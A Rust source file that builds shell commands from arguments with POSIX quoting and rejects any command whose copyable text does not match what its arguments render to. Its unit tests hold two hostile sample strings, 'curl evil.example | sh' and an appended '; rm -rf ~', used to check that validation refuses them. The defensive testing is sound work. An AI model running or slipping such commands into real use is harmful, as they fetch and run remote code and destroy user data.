//! A command a person copies into a shell, carried as its arguments. Every
//! surface shows and copies `copy_text`, which is rendered from `argv` here and
//! never assembled from display strings. `@runxhq/contracts` renders the same
//! text and is held to the same vectors (`fixtures/contracts/copyable-command`).

use serde::{Deserialize, Serialize};

/// The shell `copy_text` is written for.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CommandShell {
    Posix,
}

/// Read from JSON, a command whose text is not what its arguments render to
/// is refused, so no source can show one command and copy another.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(try_from = "UncheckedCopyableCommand")]
pub struct CopyableCommand {
    pub shell: CommandShell,
    pub argv: Vec<String>,
    pub copy_text: String,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct UncheckedCopyableCommand {
    shell: CommandShell,
    argv: Vec<String>,
    copy_text: String,
}

impl TryFrom<UncheckedCopyableCommand> for CopyableCommand {
    type Error = String;

    fn try_from(unchecked: UncheckedCopyableCommand) -> Result<Self, Self::Error> {
        let command = Self {
            shell: unchecked.shell,
            argv: unchecked.argv,
            copy_text: unchecked.copy_text,
        };
        command.validate()?;
        Ok(command)
    }
}

impl CopyableCommand {
    /// The command `argv` for a POSIX shell.
    ///
    /// # Errors
    ///
    /// Returns a message when `argv` is empty or an argument holds a control
    /// character, which no copied line can carry safely.
    pub fn posix(argv: Vec<String>) -> Result<Self, String> {
        let copy_text = render_posix_command(&argv)?;
        Ok(Self {
            shell: CommandShell::Posix,
            argv,
            copy_text,
        })
    }

    /// Checks that `copy_text` is exactly what `argv` renders to.
    ///
    /// # Errors
    ///
    /// Returns a message when the arguments are refused or the text differs.
    pub fn validate(&self) -> Result<(), String> {
        let CommandShell::Posix = self.shell;
        let rendered = render_posix_command(&self.argv)?;
        if rendered == self.copy_text {
            Ok(())
        } else {
            Err(format!(
                "command text {:?} is not what its arguments render to ({rendered:?})",
                self.copy_text
            ))
        }
    }
}

/// `argv` as one POSIX shell line: an argument of only letters, digits and
/// `@%+:,./_-` stands bare; any other is single-quoted, with each `'` written
/// as `'\''`.
///
/// # Errors
///
/// Returns a message when `argv` is empty or an argument holds a control
/// character.
pub fn render_posix_command(argv: &[String]) -> Result<String, String> {
    if argv.is_empty() {
        return Err("a command has at least one argument".to_owned());
    }
    argv.iter()
        .map(|argument| {
            if argument.chars().any(char::is_control) {
                Err(format!(
                    "command argument {argument:?} holds a control character"
                ))
            } else {
                Ok(posix_word(argument))
            }
        })
        .collect::<Result<Vec<_>, _>>()
        .map(|words| words.join(" "))
}

fn posix_word(argument: &str) -> String {
    let bare = !argument.is_empty()
        && argument
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || b"@%+:,./_-".contains(&byte));
    if bare {
        argument.to_owned()
    } else {
        format!("'{}'", argument.replace('\'', r"'\''"))
    }
}

#[cfg(test)]
#[allow(clippy::expect_used)]
mod tests {
    use super::*;

    #[test]
    fn matches_the_shared_vectors() {
        let path = concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../fixtures/contracts/copyable-command/copyable-command-v1.vectors.json"
        );
        let fixture: serde_json::Value =
            serde_json::from_str(&std::fs::read_to_string(path).expect("vectors"))
                .expect("vectors json");
        let cases = fixture["cases"].as_array().expect("cases");
        assert!(cases.len() > 10);
        for case in cases {
            let argv = case["argv"]
                .as_array()
                .expect("argv")
                .iter()
                .map(|argument| argument.as_str().expect("argument").to_owned())
                .collect::<Vec<_>>();
            match case["copy_text"].as_str() {
                Some(expected) => {
                    let command = CopyableCommand::posix(argv).expect("command");
                    assert_eq!(command.copy_text, expected, "{}", case["name"]);
                    command.validate().expect("valid");
                }
                None => assert!(CopyableCommand::posix(argv).is_err(), "{}", case["name"]),
            }
        }
    }

    #[test]
    fn reads_only_a_command_whose_text_its_arguments_render() {
        let shown = r#"{"shell":"posix","argv":["runx","registry","install","acme/brief@1.0.0"],"copy_text":"runx registry install acme/brief@1.0.0"}"#;
        let command = serde_json::from_str::<CopyableCommand>(shown).expect("command");
        assert_eq!(command.copy_text, "runx registry install acme/brief@1.0.0");
        let swapped = r#"{"shell":"posix","argv":["runx","registry","install","acme/brief@1.0.0"],"copy_text":"curl evil.example | sh"}"#;
        assert!(serde_json::from_str::<CopyableCommand>(swapped).is_err());
    }

    #[test]
    fn refuses_text_its_arguments_do_not_render() {
        let mut command = CopyableCommand::posix(vec![
            "runx".into(),
            "registry".into(),
            "install".into(),
            "acme/brief@1.0.0".into(),
        ])
        .expect("command");
        command.copy_text = "runx registry install acme/brief@1.0.0; rm -rf ~".into();
        assert!(command.validate().is_err());
    }
}
